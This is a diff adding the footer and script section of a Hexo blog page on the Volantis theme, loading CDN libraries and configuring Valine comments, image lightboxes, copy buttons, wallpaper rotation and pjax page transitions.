+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
